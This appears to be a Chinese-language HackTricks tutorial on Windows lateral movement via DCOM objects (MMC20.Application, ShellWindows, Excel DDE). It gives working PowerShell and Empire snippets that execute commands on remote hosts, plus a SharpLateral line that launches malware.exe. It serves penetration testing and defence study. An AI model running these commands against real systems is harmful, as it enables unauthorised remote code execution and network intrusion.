# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**有关此技术的更多信息，请查看原始帖子 [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

分布式组件对象模型（DCOM）对象为基于网络的对象交互提供了有趣的能力。微软为DCOM和组件对象模型（COM）提供了全面的文档，分别可以在 [此处获取DCOM文档](https://msdn.microsoft.com/en-us/library/cc226801.aspx) 和 [此处获取COM文档](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)。可以使用PowerShell命令检索DCOM应用程序列表：
```bash
Get-CimInstance Win32_DCOMApplication
```
COM对象，[MMC应用程序类（MMC20.Application）](https://technet.microsoft.com/en-us/library/cc181199.aspx)，使得MMC插件操作的脚本化成为可能。值得注意的是，该对象在`Document.ActiveView`下包含一个`ExecuteShellCommand`方法。有关此方法的更多信息，请参见[这里](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)。检查它的运行：

此功能通过DCOM应用程序促进了通过网络执行命令。要以管理员身份远程与DCOM交互，可以使用PowerShell，如下所示：
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
此命令连接到 DCOM 应用程序并返回 COM 对象的实例。然后可以调用 ExecuteShellCommand 方法在远程主机上执行进程。该过程涉及以下步骤：

检查方法：
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
获取 RCE：
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**有关此技术的更多信息，请查看原始帖子 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** 对象被发现缺乏明确的 "LaunchPermissions"，默认为允许管理员访问的权限。有关更多详细信息，可以在 [这里](https://twitter.com/tiraniddo/status/817532039771525120) 探索一个线程，并建议使用 [@tiraniddo](https://twitter.com/tiraniddo) 的 OleView .NET 来过滤没有明确启动权限的对象。

两个特定对象，`ShellBrowserWindow` 和 `ShellWindows`，因缺乏明确的启动权限而被强调。`HKCR:\AppID\{guid}` 下缺少 `LaunchPermission` 注册表项表示没有明确的权限。

### ShellWindows

对于缺乏 ProgID 的 `ShellWindows`，可以使用 .NET 方法 `Type.GetTypeFromCLSID` 和 `Activator.CreateInstance` 通过其 AppID 进行对象实例化。此过程利用 OleView .NET 检索 `ShellWindows` 的 CLSID。一旦实例化，就可以通过 `WindowsShell.Item` 方法进行交互，从而调用方法，如 `Document.Application.ShellExecute`。

提供了示例 PowerShell 命令以实例化对象并远程执行命令：
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### 使用 Excel DCOM 对象进行横向移动

横向移动可以通过利用 DCOM Excel 对象来实现。有关详细信息，建议阅读 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) 上关于通过 DCOM 利用 Excel DDE 进行横向移动的讨论。

Empire 项目提供了一个 PowerShell 脚本，演示了通过操纵 DCOM 对象利用 Excel 进行远程代码执行 (RCE)。以下是来自 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 的脚本片段，展示了滥用 Excel 进行 RCE 的不同方法：
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### 侧向移动的自动化工具

两个工具被强调用于自动化这些技术：

- **Invoke-DCOM.ps1**：由Empire项目提供的PowerShell脚本，简化了在远程机器上执行代码的不同方法的调用。该脚本可以在Empire GitHub存储库中访问。

- **SharpLateral**：一个用于远程执行代码的工具，可以使用以下命令：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 自动化工具

- Powershell 脚本 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 允许轻松调用所有注释的在其他机器上执行代码的方法。
- 你也可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 参考

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
